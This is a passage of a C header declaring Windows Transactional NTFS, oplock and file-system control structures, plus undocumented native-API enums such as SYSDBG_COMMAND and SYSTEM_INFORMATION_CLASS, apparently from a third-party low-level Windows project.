                 TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS   |   \
                 TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT          |   \
                 TXFS_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE            |   \
                 TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX            |   \
                 TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN            |   \
                 TXFS_RM_FLAG_SHRINK_LOG                            |   \
                 TXFS_RM_FLAG_GROW_LOG                              |   \
                 TXFS_RM_FLAG_ENFORCE_MINIMUM_SIZE                  |   \
                 TXFS_RM_FLAG_PRESERVE_CHANGES                      |   \
                 TXFS_RM_FLAG_RESET_RM_AT_NEXT_START                |   \
                 TXFS_RM_FLAG_DO_NOT_RESET_RM_AT_NEXT_START         |   \
                 TXFS_RM_FLAG_PREFER_CONSISTENCY                    |   \
                 TXFS_RM_FLAG_PREFER_AVAILABILITY)

typedef struct _TXFS_MODIFY_RM {

    //
    //  TXFS_RM_FLAG_* flags
    //

    ULONG Flags;

    //
    //  Maximum log container count if TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MAX is set.
    //

    ULONG LogContainerCountMax;

    //
    //  Minimum log container count if TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MIN is set.
    //

    ULONG LogContainerCountMin;

    //
    //  Target log container count for TXFS_RM_FLAG_SHRINK_LOG or _GROW_LOG.
    //

    ULONG LogContainerCount;

    //
    //  When the log is full, increase its size by this much.  Indicated as either a percent of
    //  the log size or absolute container count, depending on which of the TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_*
    //  flags is set.
    //

    ULONG LogGrowthIncrement;

    //
    //  Sets autoshrink policy if TXFS_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE is set.  Autoshrink
    //  makes the log shrink so that no more than this percentage of the log is free at any time.
    //

    ULONG LogAutoShrinkPercentage;

    //
    //  Reserved.
    //

    ULONGLONG Reserved;

    //
    //  If TXFS_RM_FLAG_LOGGING_MODE is set, this must contain one of TXFS_LOGGING_MODE_SIMPLE
    //  or TXFS_LOGGING_MODE_FULL.
    //

    USHORT LoggingMode;

} TXFS_MODIFY_RM,
 *PTXFS_MODIFY_RM;

#define TXFS_RM_STATE_NOT_STARTED       0
#define TXFS_RM_STATE_STARTING          1
#define TXFS_RM_STATE_ACTIVE            2
#define TXFS_RM_STATE_SHUTTING_DOWN     3

#define TXFS_QUERY_RM_INFORMATION_VALID_FLAGS                           \
                (TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS   |   \
                 TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT          |   \
                 TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX            |   \
                 TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN            |   \
                 TXFS_RM_FLAG_RESET_RM_AT_NEXT_START                |   \
                 TXFS_RM_FLAG_DO_NOT_RESET_RM_AT_NEXT_START         |   \
                 TXFS_RM_FLAG_PREFER_CONSISTENCY                    |   \
                 TXFS_RM_FLAG_PREFER_AVAILABILITY)

typedef struct _TXFS_QUERY_RM_INFORMATION {

	ULONG BytesRequired;
	
	ULONGLONG TailLsn;
	ULONGLONG CurrentLsn;
	ULONGLONG ArchiveTailLsn;
	ULONGLONG LogContainerSize;
	LARGE_INTEGER HighestVirtualClock;
	ULONG LogContainerCount;
	ULONG LogContainerCountMax;
	ULONG LogContainerCountMin;
	ULONG LogGrowthIncrement;
	ULONG LogAutoShrinkPercentage;
	ULONG Flags;

    //
    //  Exactly one of TXFS_LOGGING_MODE_SIMPLE or TXFS_LOGGING_MODE_FULL.
    //

    USHORT LoggingMode;

    //
    //  Reserved.
    //

    USHORT Reserved;

    //
    //  Activity state of the RM.  May be exactly one of the above-defined TXF_RM_STATE_ values.
    //

    ULONG RmState;

    //
    //  Total capacity of the log in bytes.
    //

    ULONGLONG LogCapacity;

    //
    //  Amount of free space in the log in bytes.
    //

    ULONGLONG LogFree;

    //
    //  Size of $Tops in bytes.
    //

    ULONGLONG TopsSize;

    //
    //  Amount of space in $Tops in use.
    //

    ULONGLONG TopsUsed;

    //
    //  Number of transactions active in the RM at the time of the call.
    //

    ULONGLONG TransactionCount;

    //
    //  Total number of single-phase commits that have happened the RM.
    //

    ULONGLONG OnePCCount;

    //
    //  Total number of two-phase commits that have happened the RM.
    //

    ULONGLONG TwoPCCount;

    //
    //  Number of times the log has filled up.
    //

    ULONGLONG NumberLogFileFull;

    //
    //  Age of oldest active transaction in the RM, in milliseconds.
    //

    ULONGLONG OldestTransactionAge;

		GUID RMName;

    ULONG TmLogPathOffset;

} TXFS_QUERY_RM_INFORMATION,
 *PTXFS_QUERY_RM_INFORMATION;

#define TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_REDO_LSN        0x01
#define TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_VIRTUAL_CLOCK   0x02

#define TXFS_ROLLFORWARD_REDO_VALID_FLAGS                               \
                (TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_REDO_LSN |         \
                 TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_VIRTUAL_CLOCK)

typedef struct _TXFS_ROLLFORWARD_REDO_INFORMATION {
    LARGE_INTEGER  LastVirtualClock;
    ULONGLONG LastRedoLsn;
    ULONGLONG HighestRecoveryLsn;
    ULONG Flags;
} TXFS_ROLLFORWARD_REDO_INFORMATION,
 *PTXFS_ROLLFORWARD_REDO_INFORMATION;

#define TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MAX              0x00000001
#define TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MIN              0x00000002
#define TXFS_START_RM_FLAG_LOG_CONTAINER_SIZE                   0x00000004
#define TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS  0x00000008
#define TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT         0x00000010
#define TXFS_START_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE           0x00000020
#define TXFS_START_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX           0x00000040
#define TXFS_START_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN           0x00000080

#define TXFS_START_RM_FLAG_RECOVER_BEST_EFFORT                  0x00000200
#define TXFS_START_RM_FLAG_LOGGING_MODE                         0x00000400
#define TXFS_START_RM_FLAG_PRESERVE_CHANGES                     0x00000800

#define TXFS_START_RM_FLAG_PREFER_CONSISTENCY                   0x00001000
#define TXFS_START_RM_FLAG_PREFER_AVAILABILITY                  0x00002000

#define TXFS_START_RM_VALID_FLAGS                                           \
                (TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MAX             |   \
                 TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MIN             |   \
                 TXFS_START_RM_FLAG_LOG_CONTAINER_SIZE                  |   \
                 TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS |   \
                 TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT        |   \
                 TXFS_START_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE          |   \
                 TXFS_START_RM_FLAG_RECOVER_BEST_EFFORT                 |   \
                 TXFS_START_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX          |   \
                 TXFS_START_RM_FLAG_LOGGING_MODE                        |   \
                 TXFS_START_RM_FLAG_PRESERVE_CHANGES                    |   \
                 TXFS_START_RM_FLAG_PREFER_CONSISTENCY                  |   \
                 TXFS_START_RM_FLAG_PREFER_AVAILABILITY)

typedef struct _TXFS_START_RM_INFORMATION {

    //
    //  TXFS_START_RM_FLAG_* flags.
    //

    ULONG Flags;

    //
    //  RM log container size, in bytes.  This parameter is optional.
    //

    ULONGLONG LogContainerSize;

    //
    //  RM minimum log container count.  This parameter is optional.
    //

    ULONG LogContainerCountMin;

    //
    //  RM maximum log container count.  This parameter is optional.
    //

    ULONG LogContainerCountMax;

    //
    //  RM log growth increment in number of containers or percent, as indicated
    //  by TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_* flag.  This parameter is
    //  optional.
    //

    ULONG LogGrowthIncrement;

    //
    //  RM log auto shrink percentage.  This parameter is optional.
    //

    ULONG LogAutoShrinkPercentage;

    //
    //  Offset from the beginning of this structure to the log path for the KTM
    //  instance to be used by this RM.  This must be a two-byte (WCHAR) aligned
    //  value.  This parameter is required.
    //

    ULONG TmLogPathOffset;

    //
    //  Length in bytes of log path for the KTM instance to be used by this RM.
    //  This parameter is required.
    //

    USHORT TmLogPathLength;

    //
    //  Logging mode for this RM.  One of TXFS_LOGGING_MODE_SIMPLE or
    //  TXFS_LOGGING_MODE_FULL (mutually exclusive).  This parameter is optional,
    //  and will default to TXFS_LOGGING_MODE_SIMPLE.
    //

    USHORT LoggingMode;

    //
    //  Length in bytes of the path to the log to be used by the RM.  This parameter
    //  is required.
    //

    USHORT LogPathLength;

    //
    //  Reserved.
    //

    USHORT Reserved;

    //
    //  The path to the log (in Unicode characters) to be used by the RM goes here.
    //  This parameter is required.
    //

    WCHAR LogPath[1];

} TXFS_START_RM_INFORMATION,
 *PTXFS_START_RM_INFORMATION;

//
//  Structures for FSCTL_TXFS_GET_METADATA_INFO
//

typedef struct _TXFS_GET_METADATA_INFO_OUT {

    //
    //  Returns the TxfId of the file referenced by the handle used to call this routine.
    //

    struct {
        LONGLONG LowPart;
        LONGLONG HighPart;
    } TxfFileId;

    //
    //  The GUID of the transaction that has the file locked, if applicable.
    //

    GUID LockingTransaction;

    //
    //  Returns the LSN for the most recent log record we've written for the file.
    //

    ULONGLONG LastLsn;

    //
    //  Transaction state, a TXFS_TRANSACTION_STATE_* value.
    //

    ULONG TransactionState;

} TXFS_GET_METADATA_INFO_OUT, *PTXFS_GET_METADATA_INFO_OUT;

#define TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY_FLAG_CREATED   0x00000001
#define TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY_FLAG_DELETED   0x00000002

typedef struct _TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY {

    //
    //  Offset in bytes from the beginning of the TXFS_LIST_TRANSACTION_LOCKED_FILES
    //  structure to the next TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY.
    //

    ULONGLONG Offset;

    //
    //  TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY_FLAG_* flags to indicate whether the
    //  current name was deleted or created in the transaction.
    //

    ULONG NameFlags;

    //
    //  NTFS File ID of the file.
    //

    LONGLONG FileId;

    //
    //  Reserved.
    //

    ULONG Reserved1;
    ULONG Reserved2;
    LONGLONG Reserved3;

    //
    //  NULL-terminated Unicode path to this file, relative to RM root.
    //

    WCHAR FileName[1];
} TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY, *PTXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY;


typedef struct _TXFS_LIST_TRANSACTION_LOCKED_FILES {

    //
    //  GUID name of the KTM transaction that files should be enumerated from.
    //

    GUID KtmTransaction;

    //
    //  On output, the number of files involved in the transaction on this RM.
    //

    ULONGLONG NumberOfFiles;

    //
    //  The length of the buffer required to obtain the complete list of files.
    //  This value may change from call to call as the transaction locks more files.
    //

    ULONGLONG BufferSizeRequired;

    //
    //  Offset in bytes from the beginning of this structure to the first
    //  TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY.
    //

    ULONGLONG Offset;
} TXFS_LIST_TRANSACTION_LOCKED_FILES, *PTXFS_LIST_TRANSACTION_LOCKED_FILES;

//
//  Structures for FSCTL_TXFS_LIST_TRANSACTIONS
//

typedef struct _TXFS_LIST_TRANSACTIONS_ENTRY {

    //
    //  Transaction GUID.
    //

    GUID TransactionId;

    //
    //  Transaction state, a TXFS_TRANSACTION_STATE_* value.
    //

    ULONG TransactionState;

    //
    //  Reserved fields
    //

    ULONG Reserved1;
    ULONG Reserved2;
    LONGLONG Reserved3;
} TXFS_LIST_TRANSACTIONS_ENTRY, *PTXFS_LIST_TRANSACTIONS_ENTRY;

typedef struct _TXFS_LIST_TRANSACTIONS {

    //
    //  On output, the number of transactions involved in this RM.
    //

    ULONGLONG NumberOfTransactions;

    //
    //  The length of the buffer required to obtain the complete list of
    //  transactions.  Note that this value may change from call to call
    //  as transactions enter and exit the system.
    //

    ULONGLONG BufferSizeRequired;
} TXFS_LIST_TRANSACTIONS, *PTXFS_LIST_TRANSACTIONS;


#if _MSC_VER >= 1200
#pragma warning(push)
#endif
#pragma warning(disable:4201)       // unnamed struct

typedef struct _TXFS_READ_BACKUP_INFORMATION_OUT {
    union {

        //
        //  Used to return the required buffer size if return code is STATUS_BUFFER_OVERFLOW
        //

        ULONG BufferLength;

        //
        //  On success the data is copied here.
        //

        UCHAR Buffer[1];
    } DUMMYUNIONNAME;
} TXFS_READ_BACKUP_INFORMATION_OUT, *PTXFS_READ_BACKUP_INFORMATION_OUT;

#if _MSC_VER >= 1200
#pragma warning(pop)
#else
#pragma warning( default : 4201 )
#endif

typedef struct _TXFS_WRITE_BACKUP_INFORMATION {
    UCHAR Buffer[1];
} TXFS_WRITE_BACKUP_INFORMATION, *PTXFS_WRITE_BACKUP_INFORMATION;

#define TXFS_TRANSACTED_VERSION_NONTRANSACTED   0xFFFFFFFE
#define TXFS_TRANSACTED_VERSION_UNCOMMITTED     0xFFFFFFFF

typedef struct _TXFS_GET_TRANSACTED_VERSION {

    //
    //  The version that this handle is opened to.  This will be
    //  TXFS_TRANSACTED_VERSION_UNCOMMITTED for nontransacted and
    //  transactional writer handles.
    //

    ULONG ThisBaseVersion;

    //
    //  The most recent committed version available.
    //

    ULONG LatestVersion;

    //
    //  If this is a handle to a miniversion, the ID of the miniversion.
    //  If it is not a handle to a minivers, this field will be 0.
    //

    USHORT ThisMiniVersion;

    //
    //  The first available miniversion.  Unless the miniversions are
    //  visible to the transaction bound to this handle, this field will be zero.
    //

    USHORT FirstMiniVersion;

    //
    //  The latest available miniversion.  Unless the miniversions are
    //  visible to the transaction bound to this handle, this field will be zero.
    //

    USHORT LatestMiniVersion;

} TXFS_GET_TRANSACTED_VERSION, *PTXFS_GET_TRANSACTED_VERSION;


#define TXFS_SAVEPOINT_SET                      0x00000001

//
//  Roll back to a specified savepoint.
//

#define TXFS_SAVEPOINT_ROLLBACK                 0x00000002

//
//  Clear (make unavailable for rollback) the most recently set savepoint
//  that has not yet been cleared.
//

#define TXFS_SAVEPOINT_CLEAR                    0x00000004

//
//  Clear all savepoints from the transaction.
//

#define TXFS_SAVEPOINT_CLEAR_ALL                0x00000010

typedef struct _TXFS_SAVEPOINT_INFORMATION {
    HANDLE KtmTransaction;
    ULONG ActionCode;
    ULONG SavepointId;
} TXFS_SAVEPOINT_INFORMATION, *PTXFS_SAVEPOINT_INFORMATION;


typedef struct _TXFS_CREATE_MINIVERSION_INFO {

    USHORT StructureVersion;
    USHORT StructureLength;
    ULONG BaseVersion;
    USHORT MiniVersion;
} TXFS_CREATE_MINIVERSION_INFO, *PTXFS_CREATE_MINIVERSION_INFO;


typedef struct _TXFS_TRANSACTION_ACTIVE_INFO {
	BOOLEAN TransactionsActiveAtSnapshot;

} TXFS_TRANSACTION_ACTIVE_INFO, *PTXFS_TRANSACTION_ACTIVE_INFO;

#endif /* _WIN32_WINNT >= 0x0600 */

#if (_WIN32_WINNT >= 0x0601)

typedef struct _BOOT_AREA_INFO {

    ULONG               BootSectorCount;  // the count of boot sectors present on the file system
    struct {
        LARGE_INTEGER   Offset;
    } BootSectors[2];                     // variable number of boot sectors.

} BOOT_AREA_INFO, *PBOOT_AREA_INFO;

typedef struct _RETRIEVAL_POINTER_BASE {

    LARGE_INTEGER       FileAreaOffset; // sector offset to the first allocatable unit on the filesystem
} RETRIEVAL_POINTER_BASE, *PRETRIEVAL_POINTER_BASE;

typedef struct _FILE_FS_PERSISTENT_VOLUME_INFORMATION {

    ULONG VolumeFlags;
    ULONG FlagMask;
    ULONG Version;
    ULONG Reserved;

} FILE_FS_PERSISTENT_VOLUME_INFORMATION, *PFILE_FS_PERSISTENT_VOLUME_INFORMATION;

typedef struct _FILE_SYSTEM_RECOGNITION_INFORMATION {

    CHAR FileSystem[9];

} FILE_SYSTEM_RECOGNITION_INFORMATION, *PFILE_SYSTEM_RECOGNITION_INFORMATION;

#define OPLOCK_LEVEL_CACHE_READ         (0x00000001)
#define OPLOCK_LEVEL_CACHE_HANDLE       (0x00000002)
#define OPLOCK_LEVEL_CACHE_WRITE        (0x00000004)

#define REQUEST_OPLOCK_INPUT_FLAG_REQUEST               (0x00000001)
#define REQUEST_OPLOCK_INPUT_FLAG_ACK                   (0x00000002)
#define REQUEST_OPLOCK_INPUT_FLAG_COMPLETE_ACK_ON_CLOSE (0x00000004)

#define REQUEST_OPLOCK_CURRENT_VERSION          1

typedef struct _REQUEST_OPLOCK_INPUT_BUFFER {

    //
    //  This should be set to REQUEST_OPLOCK_CURRENT_VERSION.
    //

    USHORT StructureVersion;

    USHORT StructureLength;

    //
    //  One or more OPLOCK_LEVEL_CACHE_* values to indicate the desired level of the oplock.
    //

    ULONG RequestedOplockLevel;

    //
    //  REQUEST_OPLOCK_INPUT_FLAG_* flags.
    //

    ULONG Flags;

} REQUEST_OPLOCK_INPUT_BUFFER, *PREQUEST_OPLOCK_INPUT_BUFFER;

#define REQUEST_OPLOCK_OUTPUT_FLAG_ACK_REQUIRED     (0x00000001)
#define REQUEST_OPLOCK_OUTPUT_FLAG_MODES_PROVIDED   (0x00000002)

typedef struct _REQUEST_OPLOCK_OUTPUT_BUFFER {

    USHORT StructureVersion;

    USHORT StructureLength;

    ULONG OriginalOplockLevel;

    ULONG NewOplockLevel;

    ULONG Flags;

    ACCESS_MASK AccessMode;

    USHORT ShareMode;

} REQUEST_OPLOCK_OUTPUT_BUFFER, *PREQUEST_OPLOCK_OUTPUT_BUFFER;


#define SD_GLOBAL_CHANGE_TYPE_MACHINE_SID   1

typedef struct _SD_CHANGE_MACHINE_SID_INPUT {

    USHORT CurrentMachineSIDOffset;
    USHORT CurrentMachineSIDLength;

    USHORT NewMachineSIDOffset;
    USHORT NewMachineSIDLength;

} SD_CHANGE_MACHINE_SID_INPUT, *PSD_CHANGE_MACHINE_SID_INPUT;

typedef struct _SD_CHANGE_MACHINE_SID_OUTPUT {

    //
    //  How many entries were successfully changed in the $Secure stream
    //

    ULONGLONG NumSDChangedSuccess;

    //
    //  How many entires failed the update in the $Secure stream
    //

    ULONGLONG NumSDChangedFail;

    //
    //  How many entires are unused in the current security stream
    //

    ULONGLONG NumSDUnused;

    //
    //  The total number of entries processed in the $Secure stream
    //

    ULONGLONG NumSDTotal;

    //
    //  How many entries were successfully changed in the $MFT file
    //

    ULONGLONG NumMftSDChangedSuccess;

    //
    //  How many entries failed the update in the $MFT file
    //

    ULONGLONG NumMftSDChangedFail;

    //
    //  Total number of entriess process in the $MFT file
    //

    ULONGLONG NumMftSDTotal;

} SD_CHANGE_MACHINE_SID_OUTPUT, *PSD_CHANGE_MACHINE_SID_OUTPUT;

//
//  Generic INPUT & OUTPUT structures for FSCTL_SD_GLOBAL_CHANGE
//

#if _MSC_VER >= 1200
#pragma warning(push)
#endif
#pragma warning(disable:4201)       // unnamed struct

typedef struct _SD_GLOBAL_CHANGE_INPUT
{
    //
    //  Input flags (none currently defined)
    //

    ULONG Flags;

    //
    //  Specifies which type of change we are doing and pics which member
    //  of the below union is in use.
    //

    ULONG ChangeType;

    union {

        SD_CHANGE_MACHINE_SID_INPUT SdChange;
    };

} SD_GLOBAL_CHANGE_INPUT, *PSD_GLOBAL_CHANGE_INPUT;

typedef struct _SD_GLOBAL_CHANGE_OUTPUT
{

    //
    //  Output State Flags (none currently defined)
    //

    ULONG Flags;

    //
    //  Specifies which below union to use
    //

    ULONG ChangeType;

    union {

        SD_CHANGE_MACHINE_SID_OUTPUT SdChange;
    };

} SD_GLOBAL_CHANGE_OUTPUT, *PSD_GLOBAL_CHANGE_OUTPUT;

#if _MSC_VER >= 1200
#pragma warning(pop)
#else
#pragma warning( default : 4201 ) /* nonstandard extension used : nameless struct/union */
#endif

//
//  Flag to indicate the encrypted file is sparse
//

#define ENCRYPTED_DATA_INFO_SPARSE_FILE    1

typedef struct _EXTENDED_ENCRYPTED_DATA_INFO {

    ULONG ExtendedCode;
    ULONG Length;
    ULONG Flags;
    ULONG Reserved;

} EXTENDED_ENCRYPTED_DATA_INFO, *PEXTENDED_ENCRYPTED_DATA_INFO;


typedef struct _LOOKUP_STREAM_FROM_CLUSTER_INPUT {
    ULONG         Flags;
    ULONG         NumberOfClusters;
    LARGE_INTEGER Cluster[1];
} LOOKUP_STREAM_FROM_CLUSTER_INPUT, *PLOOKUP_STREAM_FROM_CLUSTER_INPUT;

typedef struct _LOOKUP_STREAM_FROM_CLUSTER_OUTPUT {
    ULONG         Offset;
    ULONG         NumberOfMatches;
    ULONG         BufferSizeRequired;
} LOOKUP_STREAM_FROM_CLUSTER_OUTPUT, *PLOOKUP_STREAM_FROM_CLUSTER_OUTPUT;

#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_PAGE_FILE          0x00000001
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_DENY_DEFRAG_SET    0x00000002
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_FS_SYSTEM_FILE     0x00000004
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_FLAG_TXF_SYSTEM_FILE    0x00000008

#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_MASK          0xff000000
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_DATA          0x01000000
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_INDEX         0x02000000
#define LOOKUP_STREAM_FROM_CLUSTER_ENTRY_ATTRIBUTE_SYSTEM        0x03000000

typedef struct _LOOKUP_STREAM_FROM_CLUSTER_ENTRY {
    ULONG         OffsetToNext;
    ULONG         Flags;
    LARGE_INTEGER Reserved;
    LARGE_INTEGER Cluster;
    WCHAR         FileName[1];
} LOOKUP_STREAM_FROM_CLUSTER_ENTRY, *PLOOKUP_STREAM_FROM_CLUSTER_ENTRY;

typedef struct _FILE_TYPE_NOTIFICATION_INPUT {

    ULONG Flags;
    ULONG NumFileTypeIDs;
    GUID FileTypeID[1];

} FILE_TYPE_NOTIFICATION_INPUT, *PFILE_TYPE_NOTIFICATION_INPUT;

#define FILE_TYPE_NOTIFICATION_FLAG_USAGE_BEGIN     0x00000001      //Set when adding the specified usage on the given file
#define FILE_TYPE_NOTIFICATION_FLAG_USAGE_END       0x00000002      //Set when removing the specified usage on the given file

DEFINE_GUID( FILE_TYPE_NOTIFICATION_GUID_PAGE_FILE,         0x0d0a64a1, 0x38fc, 0x4db8, 0x9f, 0xe7, 0x3f, 0x43, 0x52, 0xcd, 0x7c, 0x5c );
DEFINE_GUID( FILE_TYPE_NOTIFICATION_GUID_HIBERNATION_FILE,  0xb7624d64, 0xb9a3, 0x4cf8, 0x80, 0x11, 0x5b, 0x86, 0xc9, 0x40, 0xe7, 0xb7 );
DEFINE_GUID( FILE_TYPE_NOTIFICATION_GUID_CRASHDUMP_FILE,    0x9d453eb7, 0xd2a6, 0x4dbd, 0xa2, 0xe3, 0xfb, 0xd0, 0xed, 0x91, 0x09, 0xa9 );
#endif /* _WIN32_WINNT >= 0x0601 */

#endif // _FILESYSTEMFSCTL_

// 21.12.2011 - end

// 09.06.2011 - end

typedef enum _SYSDBG_COMMAND
{
	SysDbgQueryModuleInformation,
	SysDbgQueryTraceInformation,
	SysDbgSetTracepoint,
	SysDbgSetSpecialCall,
	SysDbgClearSpecialCalls,
	SysDbgQuerySpecialCalls,
	SysDbgBreakPoint,
	SysDbgQueryVersion,
	SysDbgReadVirtual,
	SysDbgWriteVirtual,
	SysDbgReadPhysical,
	SysDbgWritePhysical,
	SysDbgReadControlSpace,
	SysDbgWriteControlSpace,
	SysDbgReadIoSpace,
	SysDbgWriteIoSpace,
	SysDbgReadMsr,
	SysDbgWriteMsr,
	SysDbgReadBusData,
	SysDbgWriteBusData,
	SysDbgCheckLowMemory,
	SysDbgEnableKernelDebugger,
	SysDbgDisableKernelDebugger,
	SysDbgGetAutoKdEnable,
	SysDbgSetAutoKdEnable,
	SysDbgGetPrintBufferSize,
	SysDbgSetPrintBufferSize,
	SysDbgGetKdUmExceptionEnable,
	SysDbgSetKdUmExceptionEnable,
	SysDbgGetTriageDump,
	SysDbgGetKdBlockEnable,
	SysDbgSetKdBlockEnable,
	SysDbgRegisterForUmBreakInfo,
	SysDbgGetUmBreakPid,
	SysDbgClearUmBreakPid,
	SysDbgGetUmAttachPid,
	SysDbgClearUmAttachPid
} SYSDBG_COMMAND, *PSYSDBG_COMMAND;

typedef struct _SYSDBG_VIRTUAL
{
	PVOID Address;
	PVOID Buffer;
	ULONG Request;
} SYSDBG_VIRTUAL, *PSYSDBG_VIRTUAL;

typedef struct _SYSDBG_PHYSICAL
{
	PHYSICAL_ADDRESS Address;
	PVOID Buffer;
	ULONG Request;
} SYSDBG_PHYSICAL, *PSYSDBG_PHYSICAL;

typedef struct _SYSDBG_CONTROL_SPACE
{
	ULONG64 Address;
	PVOID Buffer;
	ULONG Request;
	ULONG Processor;
} SYSDBG_CONTROL_SPACE, *PSYSDBG_CONTROL_SPACE;

typedef enum _INTERFACE_TYPE
{
	UnknownInterfaceType = 1
} INTERFACE_TYPE ;

typedef struct _SYSDBG_IO_SPACE
{
	ULONG64 Address;
	PVOID Buffer;
	ULONG Request;
	enum _INTERFACE_TYPE InterfaceType;
	ULONG BusNumber;
	ULONG AddressSpace;
} SYSDBG_IO_SPACE, *PSYSDBG_IO_SPACE;

typedef struct _SYSDBG_MSR
{
	ULONG Msr;
	ULONG64 Data;
} SYSDBG_MSR, *PSYSDBG_MSR;

typedef enum _BUS_DATA_TYPE
{
    ConfigurationSpaceUndefined = -1,
    Cmos,
    EisaConfiguration,
    Pos,
    CbusConfiguration,
    PCIConfiguration,
    VMEConfiguration,
    NuBusConfiguration,
    PCMCIAConfiguration,
    MPIConfiguration,
    MPSAConfiguration,
    PNPISAConfiguration,
    SgiInternalConfiguration,
    MaximumBusDataType
} BUS_DATA_TYPE, *PBUS_DATA_TYPE;

typedef struct _SYSDBG_BUS_DATA
{
	ULONG Address;
	PVOID Buffer;
	ULONG Request;
	enum _BUS_DATA_TYPE BusDataType;
	ULONG BusNumber;
	ULONG SlotNumber;
} SYSDBG_BUS_DATA, *PSYSDBG_BUS_DATA;

typedef struct _SYSDBG_TRIAGE_DUMP
{
	ULONG Flags;
	ULONG BugCheckCode;
	ULONG_PTR BugCheckParam1;
	ULONG_PTR BugCheckParam2;
	ULONG_PTR BugCheckParam3;
	ULONG_PTR BugCheckParam4;
	ULONG ProcessHandles;
	ULONG ThreadHandles;
	PHANDLE Handles;
} SYSDBG_TRIAGE_DUMP, *PSYSDBG_TRIAGE_DUMP;

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemPathInformation,
	SystemProcessInformation,
	SystemCallCountInformation,
	SystemDeviceInformation,
	SystemProcessorPerformanceInformation,
	SystemFlagsInformation,
	SystemCallTimeInformation,
	SystemModuleInformation,
	SystemLocksInformation,
	SystemStackTraceInformation,
	SystemPagedPoolInformation,
	SystemNonPagedPoolInformation,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPageFileInformation,
	SystemVdmInstemulInformation,
	SystemVdmBopInformation,
	SystemFileCacheInformation,
	SystemPoolTagInformation,
	SystemInterruptInformation,
	SystemDpcBehaviorInformation,
	SystemFullMemoryInformation,
	SystemLoadGdiDriverInformation,
	SystemUnloadGdiDriverInformation,
	SystemTimeAdjustmentInformation,
	SystemSummaryMemoryInformation,
	SystemMirrorMemoryInformation,
	SystemPerformanceTraceInformation,
	SystemObsolete0,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemExtendServiceTableInformation,
	SystemPrioritySeperation,
	SystemVerifierAddDriverInformation,
	SystemVerifierRemoveDriverInformation,
	SystemProcessorIdleInformation,
	SystemLegacyDriverInformation,
	SystemCurrentTimeZoneInformation,
	SystemLookasideInformation,
	SystemTimeSlipNotification,
	SystemSessionCreate,
	SystemSessionDetach,
	SystemSessionInformation,
	SystemRangeStartInformation,
	SystemVerifierInformation,
	SystemVerifierThunkExtend,
	SystemSessionProcessInformation,
	SystemLoadGdiDriverInSystemSpace,
	SystemNumaProcessorMap,
	SystemPrefetcherInformation,
	SystemExtendedProcessInformation,
	SystemRecommendedSharedDataAlignment,
	SystemComPlusPackage,
	SystemNumaAvailableMemory,
	SystemProcessorPowerInformation,
	SystemEmulationBasicInformation,				// WOW64
	SystemEmulationProcessorInformation,		// WOW64
	SystemExtendedHandleInformation,
	SystemLostDelayedWriteInformation,
	SystemBigPoolInformation,
	SystemSessionPoolTagInformation,
	SystemSessionMappedViewInformation,
	SystemHotpatchInformation,
	SystemObjectSecurityMode,
	SystemWatchdogTimerHandler,
	SystemWatchdogTimerInformation,
	SystemLogicalProcessorInformation,
	SystemWow64SharedInformation,
	SystemRegisterFirmwareTableInformationHandler,
	SystemFirmwareTableInformation,
	SystemModuleInformationEx,
	SystemVerifierTriageInformation,
	SystemSuperfetchInformation,
	SystemMemoryListInformation,
	SystemFileCacheInformationEx,
	SystemThreadPriorityClientIdInformation,
	SystemProcessorIdleCycleTimeInformation,
	SystemVerifierCancellationInformation,
